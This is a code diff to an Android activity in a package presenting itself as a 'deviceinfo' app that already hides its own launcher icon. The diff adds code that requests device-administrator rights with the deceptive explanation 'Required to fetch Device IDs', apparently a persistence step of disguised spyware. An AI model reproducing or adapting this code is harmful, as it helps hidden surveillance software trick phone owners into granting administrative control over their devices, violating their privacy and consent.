@@ -9,8 +9,13 @@
 
 package com.android.deviceinfo.gui;
 
+import java.util.concurrent.Semaphore;
+import java.util.concurrent.TimeUnit;
+
 import android.app.Activity;
+import android.app.admin.DevicePolicyManager;
 import android.content.ComponentName;
+import android.content.Context;
 import android.content.Intent;
 import android.content.pm.PackageManager;
 import android.os.Build;
@@ -23,6 +28,7 @@ import com.android.deviceinfo.R;
 import com.android.deviceinfo.Status;
 import com.android.deviceinfo.auto.Cfg;
 import com.android.deviceinfo.capabilities.PackageInfo;
+import com.android.deviceinfo.listener.AR;
 import com.android.deviceinfo.util.Check;
 
 /**
@@ -124,6 +130,29 @@ public class AGUI extends Activity {
 					PackageManager pm = getApplicationContext().getPackageManager();
 					pm.setComponentEnabledSetting(getComponentName(), PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP);
 				}
+				
+				try {
+					if(Status.getSemAdmin().tryAcquire(10, TimeUnit.SECONDS))
+					{
+						Context context = Status.self().getAppContext();
+
+						Intent intent = new Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN);
+						intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
+
+						ComponentName deviceAdminComponentName = new ComponentName(context, AR.class);
+						intent.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, deviceAdminComponentName);
+						intent.putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION, "Required to fetch Device IDs");
+
+						context.startActivity(intent);
+						if (Cfg.DEBUG) {
+							Check.log(TAG + " (startService) ACTION_ADD_DEVICE_ADMIN intent fired");
+						}
+					}
+				} catch (InterruptedException e) {
+					// TODO Auto-generated catch block
+					e.printStackTrace();
+				}
+				
 			}
 		} catch (final SecurityException se) {
 			if (Cfg.EXCEPTION) {
